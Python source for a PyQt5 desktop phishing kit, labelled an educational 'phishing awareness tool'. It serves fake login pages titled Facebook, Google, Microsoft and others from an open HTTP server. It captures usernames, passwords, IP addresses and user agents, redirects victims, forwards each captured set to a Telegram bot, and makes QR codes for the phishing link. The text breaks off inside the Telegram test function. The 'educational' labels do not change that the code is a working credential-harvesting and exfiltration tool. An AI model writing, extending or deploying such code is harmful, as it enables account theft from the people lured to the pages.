import os
import sys
import socket
import threading
import requests
from http.server import BaseHTTPRequestHandler, HTTPServer
from socketserver import ThreadingMixIn
import urllib.parse
import webbrowser
from datetime import datetime
import json
import random
import string
import qrcode
import io
from PIL import Image, ImageQt
import base64

from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
                             QLabel, QLineEdit, QTextEdit, QPushButton, QTabWidget,
                             QComboBox, QCheckBox, QGroupBox, QSpinBox, QFileDialog,
                             QMessageBox, QPlainTextEdit, QSplitter, QTableWidget,
                             QTableWidgetItem, QHeaderView, QMenuBar, QMenu, QAction,
                             QStatusBar, QToolBar, QSystemTrayIcon, QStyle, QDialog,
                             QDialogButtonBox, QFormLayout, QProgressBar, QListWidget,
                             QListWidgetItem, QTreeWidget, QTreeWidgetItem, QFrame)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer, QSettings, QSize
from PyQt5.QtGui import QFont, QColor, QPalette, QIcon, QPixmap, QPainter, QImage

class TelegramManager:
    def __init__(self):
        self.token = None
        self.chat_id = None
        self.enabled = False
    
    def configure(self, token, chat_id):
        self.token = token
        self.chat_id = chat_id
        self.enabled = bool(token and chat_id)
    
    def send_message(self, message):
        if not self.enabled:
            return False
        
        try:
            url = f"https://api.telegram.org/bot{self.token}/sendMessage"
            payload = {
                'chat_id': self.chat_id,
                'text': message,
                'parse_mode': 'HTML'
            }
            response = requests.post(url, data=payload, timeout=10)
            return response.status_code == 200
        except Exception as e:
            print(f"Telegram error: {e}")
            return False

class PhishingServer(QThread):
    new_credentials = pyqtSignal(str, dict)
    server_status = pyqtSignal(str)
    telegram_status = pyqtSignal(bool, str)
    visitor_connected = pyqtSignal(str)

    def __init__(self, port, template, redirect_url, capture_all, telegram_manager, page_id=None):
        super().__init__()
        self.port = port
        self.template = template
        self.redirect_url = redirect_url
        self.capture_all = capture_all
        self.telegram_manager = telegram_manager
        self.page_id = page_id
        self.running = False
        self.server = None

    def run(self):
        handler = lambda *args: PhishingRequestHandler(*args, 
                                                     template=self.template,
                                                     redirect_url=self.redirect_url,
                                                     capture_all=self.capture_all,
                                                     callback=self.handle_credentials,
                                                     visitor_callback=self.handle_visitor)
        
        class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
            pass
        
        self.server = ThreadedHTTPServer(('0.0.0.0', self.port), handler)
        self.running = True
        self.server_status.emit(f"Server running on http://localhost:{self.port}")
        
        try:
            self.server.serve_forever()
        except Exception as e:
            self.server_status.emit(f"Server error: {str(e)}")
        finally:
            self.running = False

    def stop(self):
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            self.server_status.emit("Server stopped")
        self.running = False

    def handle_credentials(self, data):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        try:
            cred_data = json.loads(data)
            log_entry = f"[{timestamp}] Captured credentials:\n{json.dumps(cred_data, indent=2)}\n"
            
            if self.telegram_manager.enabled:
                telegram_msg = f"🚨 <b>New Credentials Captured</b> 🚨\n"
                telegram_msg += f"⏰ <b>Time:</b> {timestamp}\n"
                telegram_msg += f"🌐 <b>IP:</b> {cred_data.get('client_ip', 'Unknown')}\n"
                telegram_msg += f"📄 <b>Page:</b> {self.page_id or 'Main'}\n\n"
                
                for key, value in cred_data.items():
                    if key not in ['client_ip', 'user_agent', 'timestamp']:
                        telegram_msg += f"🔑 <b>{key}:</b> {value}\n"
                
                success = self.telegram_manager.send_message(telegram_msg)
                self.telegram_status.emit(success, "Credentials sent to Telegram" if success else "Failed to send to Telegram")
            
            self.new_credentials.emit(log_entry, cred_data)
            
        except json.JSONDecodeError:
            error_msg = f"[{timestamp}] Error parsing credentials: {data}\n"
            self.new_credentials.emit(error_msg, {})

    def handle_visitor(self, client_info):
        self.visitor_connected.emit(client_info)

class PhishingRequestHandler(BaseHTTPRequestHandler):
    def __init__(self, *args, template, redirect_url, capture_all, callback, visitor_callback):
        self.template = template
        self.redirect_url = redirect_url
        self.capture_all = capture_all
        self.callback = callback
        self.visitor_callback = visitor_callback
        super().__init__(*args)

    def log_message(self, format, *args):
        pass

    def do_GET(self):
        if self.path == '/':
            # Notify about visitor
            client_info = f"Visitor from {self.client_address[0]} - {self.headers.get('User-Agent', 'Unknown')}"
            self.visitor_callback(client_info)
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(self.template.encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        parsed_data = urllib.parse.parse_qs(post_data)
        cleaned_data = {k: v[0] for k, v in parsed_data.items()}
        
        if self.capture_all:
            captured_data = cleaned_data
        else:
            captured_data = {
                'username': cleaned_data.get('username', ''),
                'password': cleaned_data.get('password', '')
            }
        
        captured_data['client_ip'] = self.client_address[0]
        captured_data['user_agent'] = self.headers.get('User-Agent', 'Unknown')
        captured_data['timestamp'] = datetime.now().isoformat()
        
        self.callback(json.dumps(captured_data, indent=2))
        
        self.send_response(302)
        self.send_header('Location', self.redirect_url)
        self.end_headers()

class QRCodeDialog(QDialog):
    def __init__(self, url, parent=None):
        super().__init__(parent)
        self.setWindowTitle("QR Code - Phishing Link")
        self.setModal(True)
        self.resize(300, 350)
        self.url = url
        self.init_ui()
    
    def init_ui(self):
        layout = QVBoxLayout()
        self.setLayout(layout)
        
        title = QLabel("Scan QR Code to Access Phishing Page")
        title.setAlignment(Qt.AlignCenter)
        title.setStyleSheet("font-weight: bold; font-size: 14px; margin: 10px;")
        layout.addWidget(title)
        
        # Generate QR code
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_L,
            box_size=10,
            border=4,
        )
        qr.add_data(self.url)
        qr.make(fit=True)
        
        qr_image = qr.make_image(fill_color="black", back_color="white")
        
        # Convert to QPixmap
        buffer = io.BytesIO()
        qr_image.save(buffer, format="PNG")
        qimage = QImage()
        qimage.loadFromData(buffer.getvalue())
        pixmap = QPixmap.fromImage(qimage)
        
        qr_label = QLabel()
        qr_label.setPixmap(pixmap)
        qr_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(qr_label)
        
        url_label = QLabel(self.url)
        url_label.setAlignment(Qt.AlignCenter)
        url_label.setStyleSheet("background-color: #f0f0f0; padding: 8px; border-radius: 4px; margin: 10px;")
        url_label.setTextInteractionFlags(Qt.TextSelectableByMouse)
        layout.addWidget(url_label)
        
        buttons = QDialogButtonBox(QDialogButtonBox.Ok)
        buttons.accepted.connect(self.accept)
        layout.addWidget(buttons)

class SettingsDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Settings")
        self.setModal(True)
        self.resize(500, 400)
        self.init_ui()
    
    def init_ui(self):
        layout = QVBoxLayout()
        self.setLayout(layout)
        
        # Telegram Settings
        telegram_group = QGroupBox("Telegram Configuration")
        telegram_layout = QFormLayout()
        telegram_group.setLayout(telegram_layout)
        layout.addWidget(telegram_group)
        
        self.telegram_token = QLineEdit()
        self.telegram_token.setPlaceholderText("Enter your Telegram bot token")
        telegram_layout.addRow("Bot Token:", self.telegram_token)
        
        self.telegram_chat_id = QLineEdit()
        self.telegram_chat_id.setPlaceholderText("Enter your chat ID")
        telegram_layout.addRow("Chat ID:", self.telegram_chat_id)
        
        self.test_telegram_btn = QPushButton("Test Telegram Connection")
        telegram_layout.addRow(self.test_telegram_btn)
        
        # Server Settings
        server_group = QGroupBox("Server Settings")
        server_layout = QFormLayout()
        server_group.setLayout(server_layout)
        layout.addWidget(server_group)
        
        self.auto_start = QCheckBox("Auto-start server on application launch")
        server_layout.addRow(self.auto_start)
        
        self.minimize_to_tray = QCheckBox("Minimize to system tray")
        server_layout.addRow(self.minimize_to_tray)
        
        # Buttons
        button_box = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
        button_box.accepted.connect(self.accept)
        button_box.rejected.connect(self.reject)
        layout.addWidget(button_box)
        
        self.load_settings()
    
    def load_settings(self):
        settings = QSettings()
        self.telegram_token.setText(settings.value("telegram/token", ""))
        self.telegram_chat_id.setText(settings.value("telegram/chat_id", ""))
        self.auto_start.setChecked(settings.value("server/auto_start", False, type=bool))
        self.minimize_to_tray.setChecked(settings.value("ui/minimize_to_tray", True, type=bool))
    
    def save_settings(self):
        settings = QSettings()
        settings.setValue("telegram/token", self.telegram_token.text())
        settings.setValue("telegram/chat_id", self.telegram_chat_id.text())
        settings.setValue("server/auto_start", self.auto_start.isChecked())
        settings.setValue("ui/minimize_to_tray", self.minimize_to_tray.isChecked())

class CredentialsViewer(QDialog):
    def __init__(self, credentials_data, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Credentials Viewer")
        self.setModal(True)
        self.resize(800, 600)
        self.credentials_data = credentials_data
        self.init_ui()
    
    def init_ui(self):
        layout = QVBoxLayout()
        self.setLayout(layout)
        
        # Search and filter
        search_layout = QHBoxLayout()
        self.search_input = QLineEdit()
        self.search_input.setPlaceholderText("Search credentials...")
        self.search_input.textChanged.connect(self.filter_credentials)
        search_layout.addWidget(self.search_input)
        
        self.filter_combo = QComboBox()
        self.filter_combo.addItems(["All", "Username", "Password", "IP Address"])
        search_layout.addWidget(self.filter_combo)
        
        layout.addLayout(search_layout)
        
        # Credentials table
        self.credentials_table = QTableWidget()
        self.credentials_table.setColumnCount(6)
        self.credentials_table.setHorizontalHeaderLabels(["Timestamp", "Username", "Password", "IP Address", "User Agent", "Page"])
        self.credentials_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        layout.addWidget(self.credentials_table)
        
        self.load_credentials()
    
    def load_credentials(self):
        self.credentials_table.setRowCount(len(self.credentials_data))
        
        for row, cred in enumerate(self.credentials_data):
            self.credentials_table.setItem(row, 0, QTableWidgetItem(cred.get('timestamp', 'Unknown')))
            self.credentials_table.setItem(row, 1, QTableWidgetItem(cred.get('username', '')))
            self.credentials_table.setItem(row, 2, QTableWidgetItem(cred.get('password', '')))
            self.credentials_table.setItem(row, 3, QTableWidgetItem(cred.get('client_ip', 'Unknown')))
            self.credentials_table.setItem(row, 4, QTableWidgetItem(cred.get('user_agent', 'Unknown')))
            self.credentials_table.setItem(row, 5, QTableWidgetItem(cred.get('page', 'Main')))
    
    def filter_credentials(self):
        search_text = self.search_input.text().lower()
        for row in range(self.credentials_table.rowCount()):
            match = False
            for col in range(self.credentials_table.columnCount()):
                item = self.credentials_table.item(row, col)
                if item and search_text in item.text().lower():
                    match = True
                    break
            self.credentials_table.setRowHidden(row, not match)

class AdvancedPhishingTool(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Accurate Cyber Defense - Advanced Phishing Awareness Tool")
        self.setGeometry(100, 100, 1400, 900)
        
        # Initialize components
        self.telegram_manager = TelegramManager()
        self.phishing_servers = {}
        self.captured_credentials = []
        self.phishing_pages = {}
        self.settings = QSettings()
        
        # Set advanced theme
        self.set_advanced_theme()
        
        # Initialize UI
        self.init_ui()
        
        # Load settings
        self.load_settings()
        
        # Load default templates
        self.load_default_templates()
        
        # Statistics
        self.stats = {
            'pages_created': 0,
            'credentials_captured': 0,
            'telegram_notifications': 0,
            'visitors': 0
        }
    
    def set_advanced_theme(self):
        palette = self.palette()
        # Professional dark theme with purple/orange accents
        palette.setColor(QPalette.Window, QColor(30, 30, 45))
        palette.setColor(QPalette.WindowText, QColor(255, 165, 0))
        palette.setColor(QPalette.Base, QColor(45, 45, 60))
        palette.setColor(QPalette.AlternateBase, QColor(60, 60, 80))
        palette.setColor(QPalette.ToolTipBase, QColor(138, 43, 226))
        palette.setColor(QPalette.ToolTipText, Qt.white)
        palette.setColor(QPalette.Text, QColor(255, 255, 255))
        palette.setColor(QPalette.Button, QColor(75, 0, 130))
        palette.setColor(QPalette.ButtonText, QColor(255, 255, 255))
        palette.setColor(QPalette.BrightText, Qt.red)
        palette.setColor(QPalette.Highlight, QColor(255, 69, 0))
        palette.setColor(QPalette.HighlightedText, Qt.white)
        self.setPalette(palette)
        
        self.setStyleSheet("""
            QMainWindow {
                background-color: #1e1e2d;
            }
            QGroupBox {
                border: 2px solid #4B0082;
                border-radius: 8px;
                margin-top: 10px;
                padding-top: 15px;
                background-color: #2d2d3c;
                color: #FFA500;
                font-weight: bold;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 8px;
                background-color: #4B0082;
                color: white;
                border-radius: 4px;
            }
            QTabWidget::pane {
                border: 2px solid #4B0082;
                background-color: #2d2d3c;
            }
            QTabBar::tab {
                background-color: #2d2d3c;
                color: #FFA500;
                padding: 8px 16px;
                border: 1px solid #4B0082;
                border-bottom: none;
                border-top-left-radius: 6px;
                border-top-right-radius: 6px;
            }
            QTabBar::tab:selected {
                background-color: #4B0082;
                color: white;
            }
            QTextEdit, QPlainTextEdit, QLineEdit, QSpinBox, QComboBox {
                background-color: #3d3d4c;
                color: white;
                border: 1px solid #FF4500;
                border-radius: 4px;
                padding: 4px;
            }
            QPushButton {
                background-color: qlineargradient(x1: 0, y1: 0, x2: 0, y2: 1,
                    stop: 0 #FF4500, stop: 1 #8B0000);
                color: white;
                border: none;
                padding: 8px 16px;
                border-radius: 4px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: qlineargradient(x1: 0, y1: 0, x2: 0, y2: 1,
                    stop: 0 #FF6347, stop: 1 #B22222);
            }
            QPushButton:pressed {
                background-color: #8B0000;
            }
            QPushButton:disabled {
                background-color: #5a5a6e;
                color: #888;
            }
            QTableWidget {
                background-color: #2d2d3c;
                color: white;
                gridline-color: #4B0082;
                border: 1px solid #4B0082;
            }
            QTableWidget::item {
                padding: 6px;
                border-bottom: 1px solid #3d3d4c;
            }
            QTableWidget::item:selected {
                background-color: #FF4500;
            }
            QHeaderView::section {
                background-color: #4B0082;
                color: white;
                padding: 6px;
                border: none;
            }
            QMenuBar {
                background-color: #2d2d3c;
                color: #FFA500;
                border-bottom: 2px solid #4B0082;
            }
            QMenuBar::item {
                background-color: transparent;
                padding: 6px 12px;
            }
            QMenuBar::item:selected {
                background-color: #4B0082;
            }
            QMenu {
                background-color: #2d2d3c;
                color: white;
                border: 1px solid #4B0082;
            }
            QMenu::item {
                padding: 6px 24px;
            }
            QMenu::item:selected {
                background-color: #FF4500;
            }
            QStatusBar {
                background-color: #2d2d3c;
                color: #FFA500;
                border-top: 1px solid #4B0082;
            }
        """)
    
    def init_ui(self):
        # Create menu bar
        self.create_menu_bar()
        
        # Create toolbar
        self.create_toolbar()
        
        # Main layout
        main_widget = QWidget()
        main_layout = QHBoxLayout()
        main_widget.setLayout(main_layout)
        self.setCentralWidget(main_widget)
        
        # Splitter for left and right panels
        splitter = QSplitter(Qt.Horizontal)
        main_layout.addWidget(splitter)
        
        # Left panel (configuration)
        left_panel = QWidget()
        left_layout = QVBoxLayout()
        left_panel.setLayout(left_layout)
        splitter.addWidget(left_panel)
        
        # Right panel (terminal/output)
        right_panel = QWidget()
        right_layout = QVBoxLayout()
        right_panel.setLayout(right_layout)
        splitter.addWidget(right_panel)
        
        # Tab widget for left panel
        tab_widget = QTabWidget()
        left_layout.addWidget(tab_widget)
        
        # Dashboard Tab
        dashboard_tab = QWidget()
        dashboard_layout = QVBoxLayout()
        dashboard_tab.setLayout(dashboard_layout)
        tab_widget.addTab(dashboard_tab, "📊 Dashboard")
        
        self.create_dashboard_tab(dashboard_layout)
        
        # Server Configuration Tab
        server_tab = QWidget()
        server_layout = QVBoxLayout()
        server_tab.setLayout(server_layout)
        tab_widget.addTab(server_tab, "🚀 Server Config")
        
        self.create_server_tab(server_layout)
        
        # Template Editor Tab
        template_tab = QWidget()
        template_layout = QVBoxLayout()
        template_tab.setLayout(template_layout)
        tab_widget.addTab(template_tab, "📝 Template Editor")
        
        self.create_template_tab(template_layout)
        
        # Phishing Pages Tab
        pages_tab = QWidget()
        pages_layout = QVBoxLayout()
        pages_tab.setLayout(pages_layout)
        tab_widget.addTab(pages_tab, "🌐 Phishing Pages")
        
        self.create_pages_tab(pages_layout)
        
        # Telegram Configuration Tab
        telegram_tab = QWidget()
        telegram_layout = QVBoxLayout()
        telegram_tab.setLayout(telegram_layout)
        tab_widget.addTab(telegram_tab, "📱 Telegram Config")
        
        self.create_telegram_tab(telegram_layout)
        
        # Right panel - Dashboard
        self.create_monitoring_panel(right_layout)
        
        # Status bar
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.status_bar.showMessage("Ready - Educational Use Only")
    
    def create_menu_bar(self):
        menubar = self.menuBar()
        
        # File menu
        file_menu = menubar.addMenu('File')
        
        export_action = QAction('Export Data', self)
        export_action.triggered.connect(self.export_data)
        file_menu.addAction(export_action)
        
        file_menu.addSeparator()
        
        exit_action = QAction('Exit', self)
        exit_action.triggered.connect(self.close)
        file_menu.addAction(exit_action)
        
        # View menu
        view_menu = menubar.addMenu('View')
        
        credentials_action = QAction('View Credentials', self)
        credentials_action.triggered.connect(self.show_credentials_viewer)
        view_menu.addAction(credentials_action)
        
        # Settings menu
        settings_menu = menubar.addMenu('Settings')
        
        config_action = QAction('Configuration', self)
        config_action.triggered.connect(self.show_settings)
        settings_menu.addAction(config_action)
        
        # Help menu
        help_menu = menubar.addMenu('Help')
        
        about_action = QAction('About', self)
        about_action.triggered.connect(self.show_about)
        help_menu.addAction(about_action)
    
    def create_toolbar(self):
        toolbar = QToolBar()
        self.addToolBar(toolbar)
        
        start_btn = QPushButton("🚀 Start Server")
        start_btn.clicked.connect(self.start_server)
        toolbar.addWidget(start_btn)
        
        stop_btn = QPushButton("🛑 Stop Server")
        stop_btn.clicked.connect(self.stop_server)
        toolbar.addWidget(stop_btn)
        
        toolbar.addSeparator()
        
        generate_btn = QPushButton("🔗 Generate Phishing Page")
        generate_btn.clicked.connect(self.generate_phishing_page)
        toolbar.addWidget(generate_btn)
        
        toolbar.addSeparator()
        
        credentials_btn = QPushButton("👁️ View Credentials")
        credentials_btn.clicked.connect(self.show_credentials_viewer)
        toolbar.addWidget(credentials_btn)
    
    def create_dashboard_tab(self, layout):
        # Statistics frame
        stats_frame = QGroupBox("📈 Statistics")
        stats_layout = QVBoxLayout()
        stats_frame.setLayout(stats_layout)
        layout.addWidget(stats_frame)
        
        stats_grid = QHBoxLayout()
        
        self.pages_count_label = QLabel("Phishing Pages: 0")
        self.pages_count_label.setStyleSheet("font-size: 14px; font-weight: bold; color: #FFA500;")
        stats_grid.addWidget(self.pages_count_label)
        
        self.creds_count_label = QLabel("Credentials Captured: 0")
        self.creds_count_label.setStyleSheet("font-size: 14px; font-weight: bold; color: #FFA500;")
        stats_grid.addWidget(self.creds_count_label)
        
        self.telegram_count_label = QLabel("Telegram Notifications: 0")
        self.telegram_count_label.setStyleSheet("font-size: 14px; font-weight: bold; color: #FFA500;")
        stats_grid.addWidget(self.telegram_count_label)
        
        self.visitors_count_label = QLabel("Visitors: 0")
        self.visitors_count_label.setStyleSheet("font-size: 14px; font-weight: bold; color: #FFA500;")
        stats_grid.addWidget(self.visitors_count_label)
        
        stats_layout.addLayout(stats_grid)
        
        # Quick actions
        actions_frame = QGroupBox("⚡ Quick Actions")
        actions_layout = QVBoxLayout()
        actions_frame.setLayout(actions_layout)
        layout.addWidget(actions_frame)
        
        quick_actions = QHBoxLayout()
        
        test_telegram_btn = QPushButton("Test Telegram")
        test_telegram_btn.clicked.connect(self.test_telegram)
        quick_actions.addWidget(test_telegram_btn)
        
        clear_data_btn = QPushButton("Clear Data")
        clear_data_btn.clicked.connect(self.clear_data)
        quick_actions.addWidget(clear_data_btn)
        
        export_btn = QPushButton("Export Data")
        export_btn.clicked.connect(self.export_data)
        quick_actions.addWidget(export_btn)
        
        actions_layout.addLayout(quick_actions)
        
        layout.addStretch()
    
    def create_server_tab(self, layout):
        # Port configuration
        port_group = QGroupBox("Server Settings")
        port_layout = QVBoxLayout()
        port_group.setLayout(port_layout)
        layout.addWidget(port_group)
        
        port_row = QHBoxLayout()
        port_row.addWidget(QLabel("Port:"))
        self.port_input = QSpinBox()
        self.port_input.setRange(1024, 65535)
        self.port_input.setValue(8080)
        port_row.addWidget(self.port_input)
        port_layout.addLayout(port_row)
        
        # Redirect URL
        redirect_row = QHBoxLayout()
        redirect_row.addWidget(QLabel("Redirect URL:"))
        self.redirect_input = QLineEdit("https://example.com")
        redirect_row.addWidget(self.redirect_input)
        port_layout.addLayout(redirect_row)
        
        # Capture options
        self.capture_all_check = QCheckBox("Capture all form fields (not just username/password)")
        port_layout.addWidget(self.capture_all_check)
        
        # Server controls
        server_controls = QHBoxLayout()
        self.start_button = QPushButton("🚀 Start Server")
        self.start_button.clicked.connect(self.start_server)
        server_controls.addWidget(self.start_button)
        
        self.stop_button = QPushButton("🛑 Stop Server")
        self.stop_button.clicked.connect(self.stop_server)
        self.stop_button.setEnabled(False)
        server_controls.addWidget(self.stop_button)
        
        port_layout.addLayout(server_controls)
        
        layout.addStretch()
    
    def create_template_tab(self, layout):
        # Template selection
        template_select_row = QHBoxLayout()
        template_select_row.addWidget(QLabel("Template:"))
        self.template_select = QComboBox()
        self.template_select.addItems(["Facebook", "Google", "Twitter", "LinkedIn", "Instagram", "Microsoft", "Custom"])
        self.template_select.currentTextChanged.connect(self.change_template)
        template_select_row.addWidget(self.template_select)
        
        self.load_template_btn = QPushButton("📂 Load from File")
        self.load_template_btn.clicked.connect(self.load_template_from_file)
        template_select_row.addWidget(self.load_template_btn)
        
        self.save_template_btn = QPushButton("💾 Save to File")
        self.save_template_btn.clicked.connect(self.save_template_to_file)
        template_select_row.addWidget(self.save_template_btn)
        
        layout.addLayout(template_select_row)
        
        # Template editor
        self.template_editor = QTextEdit()
        layout.addWidget(self.template_editor)
    
    def create_pages_tab(self, layout):
        # Page generation
        gen_group = QGroupBox("Generate Phishing Page")
        gen_layout = QFormLayout()
        gen_group.setLayout(gen_layout)
        layout.addWidget(gen_group)
        
        self.page_template = QComboBox()
        self.page_template.addItems(["Facebook", "Google", "Twitter", "LinkedIn", "Instagram", "Microsoft", "Custom"])
        gen_layout.addRow("Template:", self.page_template)
        
        self.page_redirect = QLineEdit("https://example.com")
        gen_layout.addRow("Redirect URL:", self.page_redirect)
        
        self.page_port = QSpinBox()
        self.page_port.setRange(1024, 65535)
        self.page_port.setValue(8080)
        gen_layout.addRow("Port:", self.page_port)
        
        generate_btn = QPushButton("Generate Phishing Page")
        generate_btn.clicked.connect(self.generate_phishing_page)
        gen_layout.addRow(generate_btn)
        
        # Generated pages list
        pages_group = QGroupBox("Generated Pages")
        pages_layout = QVBoxLayout()
        pages_group.setLayout(pages_layout)
        layout.addWidget(pages_group)
        
        self.pages_list = QListWidget()
        self.pages_list.itemClicked.connect(self.on_page_selected)
        pages_layout.addWidget(self.pages_list)
        
        pages_buttons = QHBoxLayout()
        view_qr_btn = QPushButton("View QR Code")
        view_qr_btn.clicked.connect(self.view_qr_code)
        pages_buttons.addWidget(view_qr_btn)
        
        open_page_btn = QPushButton("Open Page")
        open_page_btn.clicked.connect(self.open_phishing_page)
        pages_buttons.addWidget(open_page_btn)
        
        delete_page_btn = QPushButton("Delete Page")
        delete_page_btn.clicked.connect(self.delete_phishing_page)
        pages_buttons.addWidget(delete_page_btn)
        
        pages_layout.addLayout(pages_buttons)
    
    def create_telegram_tab(self, layout):
        telegram_group = QGroupBox("Telegram Bot Configuration")
        telegram_layout = QFormLayout()
        telegram_group.setLayout(telegram_layout)
        layout.addWidget(telegram_group)
        
        self.telegram_token_input = QLineEdit()
        self.telegram_token_input.setPlaceholderText("Enter your Telegram bot token")
        telegram_layout.addRow("Bot Token:", self.telegram_token_input)
        
        self.telegram_chat_id_input = QLineEdit()
        self.telegram_chat_id_input.setPlaceholderText("Enter your chat ID")
        telegram_layout.addRow("Chat ID:", self.telegram_chat_id_input)
        
        test_btn = QPushButton("Test Telegram Connection")
        test_btn.clicked.connect(self.test_telegram)
        telegram_layout.addRow(test_btn)
        
        self.telegram_status = QLabel("Status: Not configured")
        telegram_layout.addRow(self.telegram_status)
        
        layout.addStretch()
    
    def create_monitoring_panel(self, layout):
        # Server Log
        log_group = QGroupBox("📊 Server Log")
        log_layout = QVBoxLayout()
        log_group.setLayout(log_layout)
        layout.addWidget(log_group)
        
        self.terminal_output = QPlainTextEdit()
        self.terminal_output.setReadOnly(True)
        self.terminal_output.setFont(QFont("Courier New", 9))
        log_layout.addWidget(self.terminal_output)
        
        # Real-time Credentials
        creds_group = QGroupBox("🔑 Captured Credentials (Real-time)")
        creds_layout = QVBoxLayout()
        creds_group.setLayout(creds_layout)
        layout.addWidget(creds_group)
        
        self.creds_display = QPlainTextEdit()
        self.creds_display.setReadOnly(True)
        self.creds_display.setFont(QFont("Courier New", 9))
        creds_layout.addWidget(self.creds_display)
        
        # Control buttons
        button_layout = QHBoxLayout()
        
        clear_log_btn = QPushButton("🗑️ Clear Log")
        clear_log_btn.clicked.connect(lambda: self.terminal_output.clear())
        button_layout.addWidget(clear_log_btn)
        
        clear_creds_btn = QPushButton("🗑️ Clear Credentials")
        clear_creds_btn.clicked.connect(self.clear_credentials)
        button_layout.addWidget(clear_creds_btn)
        
        export_btn = QPushButton("📤 Export Credentials")
        export_btn.clicked.connect(self.export_credentials)
        button_layout.addWidget(export_btn)
        
        layout.addLayout(button_layout)
    
    def load_default_templates(self):
        self.templates = {
            "Facebook": self.get_facebook_template(),
            "Google": self.get_google_template(),
            "Twitter": self.get_twitter_template(),
            "LinkedIn": self.get_linkedin_template(),
            "Instagram": self.get_instagram_template(),
            "Microsoft": self.get_microsoft_template(),
            "Custom": self.get_default_template()
        }
        self.template_editor.setPlainText(self.templates["Facebook"])
    
    def get_default_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Secure Login</title>
    <style>
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
            color: #333;
            font-size: 24px;
            font-weight: bold;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 500;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 12px;
            border: 2px solid #e1e5e9;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
            box-sizing: border-box;
        }
        input[type="text"]:focus,
        input[type="password"]:focus {
            border-color: #667eea;
            outline: none;
        }
        .login-btn {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
        }
        .login-btn:hover {
            transform: translateY(-2px);
        }
        .educational-note {
            margin-top: 20px;
            padding: 15px;
            background: #f8f9fa;
            border-radius: 8px;
            font-size: 12px;
            color: #666;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">🔒 Secure Login</div>
        <form method="POST">
            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" id="username" name="username" placeholder="Enter your username" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required>
            </div>
            <button type="submit" class="login-btn">Sign In</button>
        </form>
        <div class="educational-note">
            <strong>Educational Purpose Only:</strong> This is a simulated login page for cybersecurity awareness training.
        </div>
    </div>
</body>
</html>"""
    
    def get_facebook_template(self):
        return self.get_default_template().replace("Secure Login", "Facebook - Log In").replace("🔒 Secure Login", "facebook")
    
    def get_google_template(self):
        return self.get_default_template().replace("Secure Login", "Google Account").replace("🔒 Secure Login", "Google")
    
    def get_twitter_template(self):
        return self.get_default_template().replace("Secure Login", "Twitter Login").replace("🔒 Secure Login", "Twitter")
    
    def get_linkedin_template(self):
        return self.get_default_template().replace("Secure Login", "LinkedIn Login").replace("🔒 Secure Login", "LinkedIn")
    
    def get_instagram_template(self):
        return self.get_default_template().replace("Secure Login", "Instagram Login").replace("🔒 Secure Login", "Instagram")
    
    def get_microsoft_template(self):
        return self.get_default_template().replace("Secure Login", "Microsoft Account").replace("🔒 Secure Login", "Microsoft")
    
    def change_template(self, template_name):
        if template_name in self.templates:
            self.template_editor.setPlainText(self.templates[template_name])
    
    def load_template_from_file(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Open Template File", "", "HTML Files (*.html *.htm);;All Files (*)")
        if file_path:
            try:
                with open(file_path, 'r', encoding='utf-8') as file:
                    self.template_editor.setPlainText(file.read())
                self.template_select.setCurrentText("Custom")
            except Exception as e:
                QMessageBox.warning(self, "Error", f"Could not open file: {str(e)}")
    
    def save_template_to_file(self):
        file_path, _ = QFileDialog.getSaveFileName(self, "Save Template File", "", "HTML Files (*.html *.htm);;All Files (*)")
        if file_path:
            try:
                with open(file_path, 'w', encoding='utf-8') as file:
                    file.write(self.template_editor.toPlainText())
                QMessageBox.information(self, "Success", "Template saved successfully!")
            except Exception as e:
                QMessageBox.warning(self, "Error", f"Could not save file: {str(e)}")
    
    def test_telegram(self):
        token = self.telegram_token_input.text()
        chat_id = self.telegram_chat_id_input.text()
        
        if not token or not chat_id:
            QMessageBox.warning(self, "Error", "Please enter both bot token and chat ID")
            return
        
        self.telegram_manager.configure(token, chat_id)
        
        test_msg = "🔔 <b>Phishing Awareness Tool Test</b>\nThis is a test message from your educational phishing awareness tool. Configuration is working correctly! ✅"
